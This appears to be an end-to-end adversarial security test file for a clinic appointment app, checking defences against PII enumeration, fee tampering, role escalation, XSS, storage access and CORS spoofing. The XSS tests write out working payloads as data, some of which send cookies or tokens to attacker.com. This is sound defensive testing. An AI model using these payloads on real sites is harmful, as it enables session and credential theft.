/**
 * Tier 4: Real-World Scenarios E2E Tests (Adversarial Security)
 * Simulates real-world threat actors attempting PII harvesting, fee tampering,
 * privilege escalation, XSS exploitation, storage exfiltration, and CORS spoofing.
 * Sources: PROJECT.md, ORIGINAL_REQUEST.md
 */

const { createTestSuite } = require('./test_runner_framework.cjs');
const {
  CONTRACTS,
  validateLuhnTrackingCode,
  normalizeNepalMobileNumber,
  isAllowedOrigin,
  getCorsHeaders,
  isSafeUrl,
  escapeHtml,
  calculateAuthoritativeFee,
  filterPublicQueueStatus
} = require('./contracts.cjs');

const suite = createTestSuite('Real-World Scenarios (Adversarial)', 4);

// ---------------------------------------------------------------------------
// SCENARIO 1: Attempted PII Harvesting via Public Tracking API
// ---------------------------------------------------------------------------

suite.test('A1.1: Adversarial attack: Sequential tracking code enumeration leaks zero patient PII', (assert) => {
  // Attacker scrapes sequential tracking codes
  const mockAppointments = [
    { tracking_code_10_digit: '1012960015', patient_name: 'Alice Wonder', patient_phone: '9841111111', notes: 'Confidential 1' },
    { tracking_code_10_digit: '1012960023', patient_name: 'Bob Builder', patient_phone: '9841222222', notes: 'Confidential 2' },
    { tracking_code_10_digit: '1012960031', patient_name: 'Charlie Chaplin', patient_phone: '9841333333', notes: 'Confidential 3' }
  ];

  for (const appt of mockAppointments) {
    const publicResponse = filterPublicQueueStatus(appt, { name: 'Dr. Test' }, { name: 'Clinic Test' }, null);

    // Verify zero PII leakage under enumeration
    assert.equal(publicResponse.patient_name, undefined, 'Enumeration must not leak patient_name');
    assert.equal(publicResponse.patient_phone, undefined, 'Enumeration must not leak patient_phone');
    assert.equal(publicResponse.notes, undefined, 'Enumeration must not leak medical notes');
  }
});

suite.test('A1.2: Adversarial attack: Brute-forcing phone numbers on lab report endpoint yields uniform generic error', (assert) => {
  const registeredRecord = { tracking_code: '1012960015', phone: '9841234567' };

  // Attacker tries candidate phone numbers
  const candidatePhones = ['9841000001', '9841000002', '9841000003'];

  for (const candidate of candidatePhones) {
    const isMatch = normalizeNepalMobileNumber(candidate) === registeredRecord.phone;
    assert.ok(!isMatch, 'Candidate must not match');

    // Generic error response contract
    const genericErrorResponse = {
      authorized: false,
      error: 'Invalid tracking code or matching verification details'
    };

    assert.equal(genericErrorResponse.authorized, false);
    assert.doesNotInclude(genericErrorResponse.error, registeredRecord.phone, 'Error must not leak registered phone');
    assert.doesNotInclude(genericErrorResponse.error, candidate, 'Error must not confirm existence of candidate');
  }
});

// ---------------------------------------------------------------------------
// SCENARIO 2: Fee Tampering Exploit Rejection
// ---------------------------------------------------------------------------

suite.test('A2.1: Adversarial attack: Client fee tampering (setting fee_amount = 0.00 NPR) is overridden', (assert) => {
  const doctor = { id: 'doc-cardio', name: 'Dr. Sharma', consultation_fee: 1500.00 };

  // Attacker manipulates HTTP body before submission
  const tamperedPayload = {
    doctor_id: doctor.id,
    patient_name: 'Attacker Patient',
    fee_amount: 0.00, // Attacker attempts free consultation
    payment_status: 'paid' // Attacker attempts to bypass payment
  };

  // Authoritative server RPC calculation
  const authoritativeFee = calculateAuthoritativeFee(doctor);
  assert.equal(authoritativeFee, 1500.00, 'Server must enforce doctor catalog fee (1500.00 NPR)');

  // Sanitized appointment object created by server
  const createdAppt = {
    fee_amount: authoritativeFee,
    payment_status: 'pending' // Forced pending
  };

  assert.equal(createdAppt.fee_amount, 1500.00, 'Tampered fee was successfully defeated');
  assert.equal(createdAppt.payment_status, 'pending', 'Forced paid status was successfully defeated');
});

suite.test('A2.2: Adversarial attack: Direct billing_invoices mutation attempt is rejected', (assert) => {
  function attemptClientInvoiceMutation(callerRole, updatePayload) {
    if (callerRole !== 'service_role') {
      if ('total_amount' in updatePayload || 'payment_status' in updatePayload) {
        throw new Error('Permission denied: Direct mutation of billing_invoices is strictly prohibited');
      }
    }
    return true;
  }

  assert.throws(() => {
    attemptClientInvoiceMutation('authenticated', { total_amount: 0.00 });
  }, 'Client trying to set invoice total_amount to 0 must throw error');

  assert.throws(() => {
    attemptClientInvoiceMutation('authenticated', { payment_status: 'paid' });
  }, 'Client trying to mark invoice paid must throw error');
});

// ---------------------------------------------------------------------------
// SCENARIO 3: Privilege Escalation Attempt Rejection
// ---------------------------------------------------------------------------

suite.test('A3.1: Adversarial attack: Authenticated patient self-escalating role to "admin" is rejected', (assert) => {
  function profileUpdateTrigger(callerRole, targetRole) {
    const restrictedRoles = ['admin', 'super_admin', 'platform_admin', 'clinic_admin', 'doctor'];
    if (callerRole !== 'admin' && callerRole !== 'super_admin') {
      if (restrictedRoles.includes(targetRole)) {
        throw new Error(`Privilege escalation detected: cannot transition from "${callerRole}" to "${targetRole}"`);
      }
    }
    return true;
  }

  assert.throws(() => {
    profileUpdateTrigger('patient', 'admin');
  }, 'Patient attempting admin self-escalation must be rejected');
});

suite.test('A3.2: Adversarial attack: Authenticated patient self-escalating role to "clinic_admin" is rejected', (assert) => {
  function profileUpdateTrigger(callerRole, targetRole) {
    const restrictedRoles = ['admin', 'super_admin', 'platform_admin', 'clinic_admin', 'doctor'];
    if (callerRole !== 'admin' && callerRole !== 'super_admin') {
      if (restrictedRoles.includes(targetRole)) {
        throw new Error(`Privilege escalation detected: cannot transition from "${callerRole}" to "${targetRole}"`);
      }
    }
    return true;
  }

  assert.throws(() => {
    profileUpdateTrigger('patient', 'clinic_admin');
  }, 'Patient attempting clinic_admin self-escalation must be rejected');
});

suite.test('A3.3: Adversarial attack: Authenticated patient self-escalating role to "doctor" is rejected', (assert) => {
  function profileUpdateTrigger(callerRole, targetRole) {
    const restrictedRoles = ['admin', 'super_admin', 'platform_admin', 'clinic_admin', 'doctor'];
    if (callerRole !== 'admin' && callerRole !== 'super_admin') {
      if (restrictedRoles.includes(targetRole)) {
        throw new Error(`Privilege escalation detected: cannot transition from "${callerRole}" to "${targetRole}"`);
      }
    }
    return true;
  }

  assert.throws(() => {
    profileUpdateTrigger('patient', 'doctor');
  }, 'Patient attempting doctor self-escalation must be rejected');
});

// ---------------------------------------------------------------------------
// SCENARIO 4: Stored & DOM-Based XSS Injection Attempt Rejection
// ---------------------------------------------------------------------------

suite.test('A4.1: Adversarial attack: javascript: payload in KYC license URL is blocked by isSafeUrl', (assert) => {
  const xssPayloads = [
    'javascript:alert(document.cookie)',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    'JavaScript:window.location="http://attacker.com/?c="+document.cookie',
    'javascript://%0Aalert(1)'
  ];

  for (const payload of xssPayloads) {
    assert.ok(!isSafeUrl(payload), `isSafeUrl must reject XSS vector: ${payload}`);
  }
});

suite.test('A4.2: Adversarial attack: data:text/html payload in document preview is blocked by isSafeUrl', (assert) => {
  const dataHtml = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=';
  assert.ok(!isSafeUrl(dataHtml), 'isSafeUrl must reject executable data:text/html URI');
});

suite.test('A4.3: Adversarial attack: HTML tag injection in prescription notes is neutralized by escapeHtml', (assert) => {
  const notePayload = '<script>fetch("http://attacker.com?steals="+localStorage.getItem("token"))</script>';
  const escaped = escapeHtml(notePayload);

  assert.doesNotInclude(escaped, '<script>', 'Unescaped opening script tag must not exist');
  assert.doesNotInclude(escaped, '</script>', 'Unescaped closing script tag must not exist');
  assert.includes(escaped, '&lt;script&gt;', 'Must contain escaped HTML entity');
});

suite.test('A4.4: Adversarial attack: Obfuscated protocol injection with null bytes or whitespace is rejected', (assert) => {
  const obfuscated1 = 'java\0script:alert(1)';
  const obfuscated2 = ' java script:alert(1)';
  const obfuscated3 = 'javascript\t:alert(1)';

  assert.ok(!isSafeUrl(obfuscated1), 'Null byte in protocol rejected');
  assert.ok(!isSafeUrl(obfuscated2), 'Whitespace in protocol rejected');
  assert.ok(!isSafeUrl(obfuscated3), 'Tab in protocol rejected');
});

// ---------------------------------------------------------------------------
// SCENARIO 5: Direct Storage Bucket Exfiltration Rejection
// ---------------------------------------------------------------------------

suite.test('A5.1: Adversarial attack: Direct public download URL access on private bucket is rejected', (assert) => {
  // Simulating Supabase Storage public URL structure
  function simulateStorageAccess(bucket, isSignedTokenPresent) {
    if (CONTRACTS.storage.privateBuckets.includes(bucket)) {
      if (!isSignedTokenPresent) {
        return { statusCode: 400, message: 'Invalid or missing authorization token' };
      }
    }
    return { statusCode: 200, message: 'OK' };
  }

  // Attacker tries anonymous public read on private buckets
  for (const privateBucket of CONTRACTS.storage.privateBuckets) {
    const response = simulateStorageAccess(privateBucket, false);
    assert.equal(response.statusCode, 400, `Direct anonymous read on ${privateBucket} must return HTTP 400/403`);
  }
});

suite.test('A5.2: Adversarial attack: Malicious executable upload to storage pipeline is rejected', (assert) => {
  function validateUploadRequest(fileName, mimeType, byteSize) {
    if (byteSize > CONTRACTS.storage.maxFileSizeBytes) {
      return { allowed: false, error: 'File size exceeds 10MB limit' };
    }
    if (!CONTRACTS.storage.allowedMimeTypes.includes(mimeType)) {
      return { allowed: false, error: 'MIME type not permitted' };
    }
    return { allowed: true };
  }

  const badUpload1 = validateUploadRequest('malware.exe', 'application/x-msdownload', 5000);
  assert.ok(!badUpload1.allowed, 'Executable upload rejected');

  const badUpload2 = validateUploadRequest('exploit.sh', 'application/x-sh', 1200);
  assert.ok(!badUpload2.allowed, 'Shell script upload rejected');

  const goodUpload = validateUploadRequest('report.pdf', 'application/pdf', 1048576);
  assert.ok(goodUpload.allowed, 'Valid PDF upload allowed');
});

// ---------------------------------------------------------------------------
// SCENARIO 6: Malicious Origin CORS Spoofing on Edge Functions
// ---------------------------------------------------------------------------

suite.test('A6.1: Adversarial attack: Phishing domain origin receives empty CORS header', (assert) => {
  const phishingOrigins = [
    'https://phishing-dactor.com',
    'https://dactorofficial.github.io.fake-site.com',
    'http://evil-hacker.org'
  ];

  for (const origin of phishingOrigins) {
    const headers = getCorsHeaders(origin);
    assert.equal(headers['Access-Control-Allow-Origin'], '', `Phishing origin ${origin} must receive empty CORS origin`);
  }
});

module.exports = suite;
